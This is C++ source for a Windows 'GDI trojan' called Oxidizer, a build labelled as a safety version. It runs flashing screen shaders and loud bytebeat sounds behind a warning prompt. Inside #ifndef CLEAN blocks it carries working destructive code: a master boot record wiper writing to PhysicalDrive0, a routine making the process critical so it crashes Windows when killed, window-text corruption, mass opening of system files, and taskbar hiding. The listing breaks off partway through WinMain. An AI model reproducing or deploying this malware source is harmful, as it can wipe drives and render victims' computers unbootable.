// Oxidizer (Safety) - The first steps
// 

// If this is defined, the trojan will disable all destructive payloads
// and then run the GDI only of Oxidizer, however it is not guaranteed that your system will be safe.
#define CLEAN

#include <Windows.h>
#include <tchar.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "bootrec.h"
#include "stuffs.h"
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the NEW hue function (better than GetMBR's)
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
#ifndef CLEAN
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
LPCWSTR  generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1]; // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI texts(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
#endif
DWORD WINAPI shader1(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int g = (rgbquad[i].rgbBlue + rgbquad[i].rgbGreen + rgbquad[i].rgbRed) / 3;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(g * x >> y | x & y | x >> y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int g = (rgbquad[i].rgbBlue + rgbquad[i].rgbGreen + rgbquad[i].rgbRed) / 3;

				int fx = (int)((i ^ 4) + (i * 4) * sin(g * x ^ y & x));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI SrcinvertCombo(LPVOID lpThread) { //credits to Wooshydudebro
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		BitBlt(hdc, rand() % 20, rand() % 20, screenWidth, screenHeight, hdc, rand() % 20, rand() % 20, SRCPAINT);
		BitBlt(hdc, rand() % 20, rand() % 20, screenWidth, screenHeight, hdc, rand() % 20, rand() % 20, SRCINVERT);
		BitBlt(hdc, 3, 7, screenWidth, screenHeight, hdc, 5, 3, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI textout1(LPVOID lpvd) //makmak.exe moment
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	LPCSTR text7 = 0;

	while (1)
	{
		HDC hdc = GetDC(0);
		text1 = "        ";
		text2 = "        ";
		text3 = "        ";
		text4 = "        ";
		text5 = "        ";
		text6 = "        ";
		text7 = "        ";

		SetBkColor(hdc, Hue(3));

		HFONT font = CreateFontA(43, 32, rand() % 360, rand() % 360, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));

		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(50);
		//if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI blur1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (1) {
		hdc = GetDC(0);
		//BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(dcCopy, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(dcCopy, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI blur2(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, rand() % 10, rand() % 12, w, h, hdc, rand() % -10, rand() % -12, SRCPAINT);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
#ifndef CLEAN
DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\*.*";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 10000);
		}
	}
}
#endif
DWORD WINAPI shader3(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(x ^ (y + (i * 4)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(x & (x * (i * 4)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI sines(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 360;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, NOTSRCCOPY);
			angle += M_PI / 3;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParam) {
	while (1) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			//int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed = rand();
			rgbtriple[i].rgbtGreen = rand();
			rgbtriple[i].rgbtBlue = rand();
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(6 & t) * (t >> 6) * (t >> 8) ^ (t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t) * (t & t >> 8) ^ (t >> 5 | t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t >> 8 | 5) * (t ^ t >> 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(12 * t) | (3 * t >> 6) * (3 * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((2 * t * t >> 4) - (3 * t >> 7) | (5 & t >> 8 * t) + (2 + t ^ t >> 8) * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t >> 8) * (t & t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t >> 8) * tan(t & t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 7 | t >> 9) & 30) & t << 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
#ifndef CLEAN
void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}
DWORD WINAPI notaskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
#endif
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Run the GDI malware?\nWarning!\nThis deletes physical drives, contains strong language, loud noises and flashing colors. The creator is not responsible.\n\nHowever, Oxidizer.exe has detected that you are running a peaceful version of the malware. So that no destructive payloads begin.\nNo data will be lost if you agree to execute Oxidizer and it will be exited after 4 minutes.\n\nWhile Oxidizer-safety runs, it is not fully guaranteed that your system will be safe.\nDo you want to proceed anyway?", L"Malware Warning (Safety)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		Sleep(2000);
		Sleep(2000);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
		sound2();
		Sleep(30000);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		HANDLE thread3 = CreateThread(0, 0, SrcinvertCombo, 0, 0, 0);
		HANDLE thread3dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
		sound3();
		Sleep(30000);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		InvalidateRect(0, 0, 0);
